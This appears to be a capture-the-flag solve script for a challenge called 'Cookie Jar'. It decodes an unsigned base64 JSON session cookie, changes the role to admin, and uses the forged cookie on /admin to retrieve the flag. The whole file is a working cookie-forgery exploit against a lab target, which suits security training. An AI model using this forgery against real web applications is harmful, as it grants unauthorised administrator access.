"""Cookie Jar: sign in as guest, and the session cookie is just base64 JSON
with no signature. Change "role" to "admin" and open /admin.
Usage: solve.py [host] [port]"""
import base64
import http.client
import json
import re
import sys

host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 31080

c = http.client.HTTPConnection(host, port, timeout=10)
c.request("POST", "/login", "user=guest&password=guest", {"Content-Type": "application/x-www-form-urlencoded"})
res = c.getresponse()
res.read()
cookie = re.search(r"session=([^;]+)", res.getheader("Set-Cookie")).group(1)
session = json.loads(base64.b64decode(cookie))
print("guest session:", session)

session["role"] = "admin"
forged = base64.b64encode(json.dumps(session).encode()).decode()
c.request("GET", "/admin", headers={"Cookie": "session=" + forged})
print(re.search(r"flag\{[^}]+\}", c.getresponse().read().decode()).group(0))
